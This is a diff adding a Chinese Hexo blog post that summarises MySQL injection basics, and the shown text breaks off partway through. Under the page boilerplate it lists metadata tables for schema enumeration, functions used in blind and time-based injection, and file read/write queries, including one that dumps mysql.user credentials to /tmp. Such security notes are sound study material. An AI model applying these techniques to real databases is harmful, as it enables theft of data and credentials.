@@ -1,0 +1,3200 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="Sariel.D">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Sariel.D">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="日常小结，大佬无视">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Mysql 注入基础小结">
+<meta property="og:url" content="https://blog.sari3l.com/posts/9622f295/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="日常小结，大佬无视">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="article:published_time" content="2019-09-12T13:12:11.000Z">
+<meta property="article:modified_time" content="2020-07-06T09:45:15.438Z">
+<meta property="article:author" content="Sariel.D">
+<meta property="article:tag" content="Mysql">
+<meta property="article:tag" content="SQLi">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    
+    <link rel="alternate" href="/atom.xml" title="Learning Man&#39;s Blog" type="application/atom+xml">
+    
+    <title>Mysql 注入基础小结 · Learning Man</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io@latest/css/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/favicon.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io@latest/scripts/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+    <script>
+        (function (i, s, o, g, r, a, m) {
+        i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
+        (i[r].q = i[r].q || []).push(arguments)
+        }, i[r].l = 1 * new Date(); a = s.createElement(o),
+        m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
+        })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
+        ga('create', 'UA-129685149-2', 'auto');
+        ga('send', 'pageview');
+    </script>
+    
+<meta name="generator" content="Hexo 4.2.1"><link rel="stylesheet" href="/css/prism-funky.css" type="text/css"></head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Learning Man&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">Mysql 注入基础小结</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>Learning Man's Blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            Mysql 注入基础小结
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "Mysql">Mysql</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "SQLi">SQLi</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">4.7k</span>阅读时长: <span class="post-count reading-time">21 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/09/12</span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <!--<img class="loading" src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/images/loading.gif" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        -->
+        <img class="loading" src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>首先需要了解一下数据库结构，在 Mysql 中，默认库有三个</p>
+<ul>
+<li>information_schema</li>
+<li>mysql</li>
+<li>performance_schema</li>
+</ul>
+<p>其中<code>performance_schema</code>用于性能分析，而<code>information_schema</code>用于存储<strong>数据库元数据</strong>(关于数据的数据)，例如<strong>数据库名、表名、列的数据类型、访问权限</strong>等</p>
+<h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><p>SELECT Syntax</p>
+<pre class=" language-plain"><code class="language-plain">SELECT
+    [ALL | DISTINCT | DISTINCTROW ]
+      [HIGH_PRIORITY]
+      [STRAIGHT_JOIN]
+      [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]
+      [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]
+    select_expr [, select_expr ...]
+    [FROM table_references
+      [PARTITION partition_list]
+    [WHERE where_condition]
+    [GROUP BY {col_name | expr | position}
+      [ASC | DESC], ... [WITH ROLLUP]]
+    [HAVING where_condition]
+    [ORDER BY {col_name | expr | position}
+      [ASC | DESC], ...]
+    [LIMIT {[offset,] row_count | row_count OFFSET offset}]
+    [PROCEDURE procedure_name(argument_list)]
+    [INTO OUTFILE 'file_name'
+        [CHARACTER SET charset_name]
+        export_options
+      | INTO DUMPFILE 'file_name'
+      | INTO var_name [, var_name]]
+    [FOR UPDATE | LOCK IN SHARE MODE]]</code></pre>
+<h2 id="0x01-注入常用表、目标字段"><a href="#0x01-注入常用表、目标字段" class="headerlink" title="0x01 注入常用表、目标字段"></a>0x01 注入常用表、目标字段</h2><h3 id="可查字段"><a href="#可查字段" class="headerlink" title="可查字段"></a>可查字段</h3><ul>
+<li><p>schema</p>
+<ul>
+<li><code>information_schema.COLUMNS</code> -&gt; <code>TABLE_SCHEMA</code></li>
+<li><code>information_schema.KEY_COLUMN_USAGE</code> -&gt; <code>CONSTRAINT_SCHEMA</code>, <code>TABLE_SCHEMA</code>, <code>REFERENCED_TABLE_SCHEMA</code></li>
+<li><code>information_schema.PARTITIONS</code> -&gt; <code>TABLE_SCHEMA</code></li>
+<li><code>information_schema.SCHEMATA</code> -&gt; <code>SCHEMA_NAME</code></li>
+<li><code>information_schema.STATISTICS</code> -&gt; <code>TABLE_SCHEMA</code></li>
+<li><code>information_schema.TABLES</code> -&gt; <code>TABLE_SCHEMA</code></li>
+<li><code>information_schema.TABLE_CONSTRAINTS</code> -&gt; <code>CONSTRAINT_SCHEMA</code>, <code>TABLE_SCHEMA</code></li>
+<li><code>mysql.INNODB_INDEX_STATS</code> -&gt; <code>database_name</code></li>
+<li><code>mysql.INNODB_TABLE_STATS</code> -&gt; <code>database_name</code></li>
+</ul>
+</li>
+<li><p>table</p>
+<ul>
+<li><code>information_schema.COLUMNS</code> -&gt; <code>TABLE_NAME</code></li>
+<li><code>information_schema.KEY_COLUMN_USAGE</code> -&gt; <code>TABLE_NAME</code>, <code>REFERENCED_TABLE_NAME</code></li>
+<li><code>information_schema.PARTITIONS</code> -&gt; <code>TABLE_NAME</code></li>
+<li><code>information_schema.STATISTICS</code> -&gt; <code>TABLE_NAME</code></li>
+<li><code>information_schema.TABLES</code> -&gt; <code>TABLE_NAME</code></li>
+<li><code>information_schema.TABLE_CONSTRAINTS</code> -&gt; <code>TABLE_NAME</code></li>
+<li><code>mysql.INNODB_INDEX_STATS</code> -&gt; <code>table_name</code></li>
+<li><code>mysql.INNODB_TABLE_STATS</code> -&gt; <code>table_name</code></li>
+</ul>
+</li>
+<li><p>column</p>
+<ul>
+<li><code>information_schema.COLUMNS</code> -&gt; <code>COLUMN_NAME</code></li>
+<li><code>information_schema.KEY_COLUMN_USAGE</code> -&gt; <code>COLUMN_NAME</code>, <code>REFERENCED_COLUMN_NAME</code></li>
+<li><code>information_schema.STATISTICS</code> -&gt; <code>COLUMN_NAME</code></li>
+</ul>
+</li>
+</ul>
+<p><strong>速查能力表</strong></p>
+<p><code>i.xx</code>指代<code>information_schema.xx</code><br><code>m.xx</code>指代<code>mysql.xx</code></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>Schema</th>
+<th>Table</th>
+<th>Column</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>i.COLUMNS</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>✔️</td>
+</tr>
+<tr>
+<td>i.KEY_COLUMN_USAGE</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>✔️</td>
+</tr>
+<tr>
+<td>i.PARTITIONS</td>
+<td>✔️</td>
+<td>✔️</td>
+<td></td>
+</tr>
+<tr>
+<td>i.SCHEMATA</td>
+<td>✔️</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>i.STATISTICS</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>✔️</td>
+</tr>
+<tr>
+<td>i.TABLES</td>
+<td>✔️</td>
+<td>✔️</td>
+<td></td>
+</tr>
+<tr>
+<td>i.TABLE_CONSTRAINTS</td>
+<td>✔️</td>
+<td>✔️</td>
+<td></td>
+</tr>
+<tr>
+<td>m.INNODB_INDEX_STATS</td>
+<td>✔️</td>
+<td>✔️</td>
+<td></td>
+</tr>
+<tr>
+<td>m.INNODB_TABLE_STATS</td>
+<td>✔️</td>
+<td>✔️</td>
+<td></td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>Schema</th>
+<th>Table</th>
+<th>Column</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>i.COLUMNS</td>
+<td>TABLE_SCHEMA</td>
+<td>TABLE_NAME</td>
+<td>COLUMN_NAME</td>
+</tr>
+<tr>
+<td>i.KEY_COLUMN_USAGE</td>
+<td>CONSTRAINT_SCHEMA<br>TABLE_SCHEMA<br>REFERENCED_TABLE_SCHEMA</td>
+<td>TABLE_NAME<br>REFERENCED_TABLE_NAME</td>
+<td>COLUMN_NAME<br>REFERENCED_COLUMN_NAME</td>
+</tr>
+<tr>
+<td>i.PARTITIONS</td>
+<td>TABLE_SCHEMA</td>
+<td>TABLE_NAME</td>
+<td></td>
+</tr>
+<tr>
+<td>i.SCHEMATA</td>
+<td>SCHEMA_NAME</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>i.STATISTICS</td>
+<td>TABLE_SCHEMA</td>
+<td>TABLE_NAME</td>
+<td>COLUMN_NAME</td>
+</tr>
+<tr>
+<td>i.TABLES</td>
+<td>TABLE_SCHEMA</td>
+<td>TABLE_NAME</td>
+<td></td>
+</tr>
+<tr>
+<td>i.TABLE_CONSTRAINTS</td>
+<td>CONSTRAINT_SCHEMA<br>TABLE_SCHEMA</td>
+<td>TABLE_NAME</td>
+<td></td>
+</tr>
+<tr>
+<td>m.INNODB_INDEX_STATS</td>
+<td>database_name</td>
+<td>table_name</td>
+<td></td>
+</tr>
+<tr>
+<td>m.INNODB_TABLE_STATS</td>
+<td>database_name</td>
+<td>table_name</td>
+<td></td>
+</tr>
+</tbody></table>
+<h2 id="0x02-常见函数"><a href="#0x02-常见函数" class="headerlink" title="0x02 常见函数"></a>0x02 常见函数</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><h4 id="if、when-case"><a href="#if、when-case" class="headerlink" title="if、when case"></a>if、when case</h4><ul>
+<li>IF(expr1,expr2,expr3)</li>
+</ul>
+<p>如果 expr1 为真，且不为 0 不为 NULL，返回 expr2，否则返回 expr3</p>
+<hr>
+<p>注意 if 函数和 if 语法的区别</p>
+<p>另外 if 语法和 case 语法很相似，在末尾都可以直接 end</p>
+<pre class=" language-plain"><code class="language-plain">IF search_condition THEN statement_list
+    [ELSEIF search_condition THEN statement_list] ...
+    [ELSE statement_list]
+END IF</code></pre>
+<pre class=" language-plain"><code class="language-plain">CASE case_value
+    WHEN when_value THEN statement_list
+    [WHEN when_value THEN statement_list] ...
+    [ELSE statement_list]
+END CASE
+
+Or:
+
+- CASE
+    WHEN search_condition THEN statement_list
+    [WHEN search_condition THEN statement_list] ...
+    [ELSE statement_list]
+END CASE</code></pre>
+<h4 id="ifnull"><a href="#ifnull" class="headerlink" title="ifnull"></a>ifnull</h4><ul>
+<li>IFNULL(expr1,expr2)</li>
+</ul>
+<p>如果 expr1 不为 NULL，则返回 expr1，否则返回 expr2</p>
+<h4 id="nullif"><a href="#nullif" class="headerlink" title="nullif"></a>nullif</h4><ul>
+<li>NULLIF(expr1,expr2)</li>
+</ul>
+<p>如果 expr1 == expr2 为真，则返回 NULL，否则返回 expr1</p>
+<h3 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a><a href="https://dev.mysql.com/doc/refman/5.7/en/string-functions.html" target="_blank" rel="noopener">字符串操作</a></h3><p>字符操作函数很多，而且时常使用，这里举一般注入很少用到的几个</p>
+<h4 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h4><h5 id="elt-区间分组"><a href="#elt-区间分组" class="headerlink" title="elt 区间分组"></a>elt 区间分组</h5><ul>
+<li>ELT(N,str1,str2,str3,…)</li>
+</ul>
+<p>返回第 N 个字符串内容</p>
+<h5 id="make-set"><a href="#make-set" class="headerlink" title="make_set"></a>make_set</h5><ul>
+<li>MAKE_SET(bits,str1,str2,…)</li>
+</ul>
+<p>首先将 bits 倒置，然后取每一位为 1 的对应字符串</p>
+<pre class=" language-plain"><code class="language-plain">mysql> select make_set(17, "a","b","c","d","e","f");
+                -> a,e
+mysql> select make_set(5, "a","b","c","d","e","f");
+                -> a,c</code></pre>
+<pre class=" language-plain"><code class="language-plain">17 -> 10001 -倒置-> 10001 
+a | b | c | d | e
+1 | 0 | 0 | 0 | 1
+
+5 -> 0101 -倒置-> 1010 
+a | b | c | d | e
+1 | 0 | 1 | 0 | </code></pre>
+<h5 id="FIELD"><a href="#FIELD" class="headerlink" title="FIELD"></a>FIELD</h5><ul>
+<li>FIELD(str,str1,str2,str3,…)</li>
+</ul>
+<p>返回 str 在后面参数中的位置，如果没有找到则返回 0。此函数为 elt 函数的补充</p>
+<h5 id="FIND-IN-SET"><a href="#FIND-IN-SET" class="headerlink" title="FIND_IN_SET"></a>FIND_IN_SET</h5><ul>
+<li>FIND_IN_SET(str,strlist)</li>
+</ul>
+<p>strlist 中使用<code>,</code>分割，返回 str 所在位置，如果没有找到则返回 0</p>
+<pre class=" language-mysql"><code class="language-mysql">mysql> SELECT FIND_IN_SET('b','a,b,c,d');
+        -> 2
+mysql> SELECT FIND_IN_SET(substr(user(),1,4),'1,root');
+        -> 2</code></pre>
+<h4 id="分割函数"><a href="#分割函数" class="headerlink" title="分割函数"></a>分割函数</h4><pre class=" language-plain"><code class="language-plain">left(str, N) &#60;-> substr(str, 1, N) &#60;-> mid(str, 1, N)
+right(str, N) &#60;-> substr(str, -N) &#60;-> mid(str, -N)</code></pre>
+<h4 id="扩展函数"><a href="#扩展函数" class="headerlink" title="扩展函数"></a>扩展函数</h4><h5 id="rpad"><a href="#rpad" class="headerlink" title="rpad"></a>rpad</h5><ul>
+<li>RPAD(str,len,padstr)</li>
+</ul>
+<p>*<em>注意：len 最大长度为 1048576，即 1024</em>1024，否则直接返回 NULL</p>
+<p>将字符串 str 填充为长度 len 的字符串，扩充的位置均为 padstr</p>
+<p>当 len &#60; len(str) 时，就位字符串切割了，例如</p>
+<pre class=" language-plain"><code class="language-plain">mysql> select rpad(user(), 4, 0x0);
+            -> root</code></pre>
+<p><strong>同理如 lpad</strong></p>
+<h5 id="repeat"><a href="#repeat" class="headerlink" title="repeat"></a>repeat</h5><ul>
+<li><p>REPEAT(str,count)</p>
+<ul>
+<li>count &#60; 1 返回空字符串</li>
+<li>count = NULL 返回 NULL</li>
+</ul>
+</li>
+</ul>
+<h3 id="比较函数"><a href="#比较函数" class="headerlink" title="比较函数"></a>比较函数</h3><h5 id="INTERVAL"><a href="#INTERVAL" class="headerlink" title="INTERVAL"></a>INTERVAL</h5><ul>
+<li>INTERVAL(N,N1,N2,N3,…)</li>
+</ul>
+<blockquote>
+<p>Returns 0 if N &#60; N1, 1 if N &#60; N2…</p>
+</blockquote>
+<p>实际这是比较函数，可以用来二分法查找，注意 N1….只能为数字</p>
+<pre class=" language-plain"><code class="language-plain">mysql> SELECT INTERVAL(ord(left(user(),1)),114,115);
+            -> 1</code></pre>
+<h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><h4 id="cast"><a href="#cast" class="headerlink" title="cast"></a>cast</h4><ul>
+<li>CAST(expr AS type)</li>
+</ul>
+<p>TypeList:</p>
+<ul>
+<li>BINARY：二进制</li>
+<li>CHAR[(N)]：字符型 </li>
+<li>DATE：日期型</li>
+<li>DATETIME：日期和时间型</li>
+<li>DECIMAL：float型</li>
+<li>SIGNED：int</li>
+<li>TIME：时间型</li>
+<li>UNSIGNED：无符号整型</li>
+</ul>
+<h4 id="convert"><a href="#convert" class="headerlink" title="convert"></a>convert</h4><ul>
+<li>CONVERT(expr,type), CONVERT(expr USING transcoding_name)</li>
+</ul>
+<h3 id="时间函数"><a href="#时间函数" class="headerlink" title="时间函数"></a>时间函数</h3><h4 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h4><p>这里有个有趣点的，如果 sleep 跟在 where、order by 后面使用，则<br>time = row.length * sleep_time</p>
+<p>即如果有3条数据，且sleep(1)，则延时3*1=3s</p>
+<h3 id="信息函数"><a href="#信息函数" class="headerlink" title="信息函数"></a>信息函数</h3><h4 id="benchmark"><a href="#benchmark" class="headerlink" title="benchmark"></a>benchmark</h4><ul>
+<li>BENCHMARK(count,expr)</li>
+</ul>
+<p>一般用于基准执行时间测试，利用于延时注入，但受影响比较多，需要大量测试取阈值</p>
+<pre class=" language-plain"><code class="language-plain">mysql> SELECT BENCHMARK(10000000, md5('1'));
+在测试机上得到有以下执行时间，可见基本是大于2秒的
+1 row in set (3.23 sec)
+1 row in set (2.78 sec)
+1 row in set (2.58 sec)
+1 row in set (2.89 sec)</code></pre>
+<h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><p>注意：需要的条件有</p>
+<ol>
+<li><p>FILE权限</p>
+<pre class=" language-plain"><code class="language-plain"> mysql> select Host, User, File_priv from user;
+ update mysql.user set file_priv='Y' where user='&#60;user>';
+ flush privileges;</code></pre>
+</li>
+<li><p>路径可写权限</p>
+<p> <code>select @@secure_file_priv</code> 修改后需重启</p>
+<ul>
+<li><p><code>NULL</code>：禁止导入导出功能</p>
+</li>
+<li><p><code>&amp;#60;path&gt;</code>：指定允许导入导出的功能</p>
+</li>
+<li><p>空：无导入导出限制</p>
+<p>修改：</p>
+<pre class=" language-plain"><code class="language-plain">//限制mysqld 不允许导入 | 导出:
+mysqld --secure_file_prive=null
+
+//限制mysqld 的导入 | 导出 只能发生在/tmp/目录下:
+mysqld --secure_file_priv=/tmp/
+
+//不对mysqld 的导入 | 导出做限制:
+cat /etc/my.cnf
+[mysqld]
+secure_file_priv=</code></pre>
+</li>
+</ul>
+</li>
+<li><p>服务器可写绝度路径</p>
+</li>
+</ol>
+<hr>
+<p>函数区别：</p>
+<ul>
+<li>outfile函数可以导出多行，而dumpfile只能导出一行数据</li>
+<li>outfile函数在将数据写到文件里时有特殊的格式转换，而dumpfile则保持原数据格式</li>
+</ul>
+<h4 id="into-dumpfile"><a href="#into-dumpfile" class="headerlink" title="into dumpfile"></a>into dumpfile</h4><pre class=" language-plain"><code class="language-plain">mysql> SELECT 0x5e5e5e INTO DUMPFILE '&#60;path>';
+mysql> SELECT 'content' INTO DUMPFILE '&#60;path>';</code></pre>
+<h4 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile"></a>into outfile</h4><ul>
+<li><code>FIELDS ESCAPED BY</code>：对指定的字符进行转义</li>
+<li><code>FIELDS [OPTIONALLY] ENCLOSED BY</code>：对字段值进行包裹</li>
+<li><code>FIELDS TERMINATED BY</code>：对字段值之间进行分割</li>
+</ul>
+<p>例如</p>
+<pre class=" language-plain"><code class="language-plain"># 字段间使用,分割 使用"对字段包裹，每行后加\n
+mysql> select * from mysql.user into outfile '/tmp/data1' fields terminated by ',' optionally enclosed by '"' lines terminated by '\n';</code></pre>
+<h4 id="load-file"><a href="#load-file" class="headerlink" title="load_file"></a>load_file</h4><pre class=" language-plain"><code class="language-plain">mysql> SELECT LOAD_FILE('&#60;path>') AS Result;</code></pre>
+<h4 id="load-data"><a href="#load-data" class="headerlink" title="load data"></a>load data</h4><p>为<code>SELECT ... INTO OUTFILE</code>的补充</p>
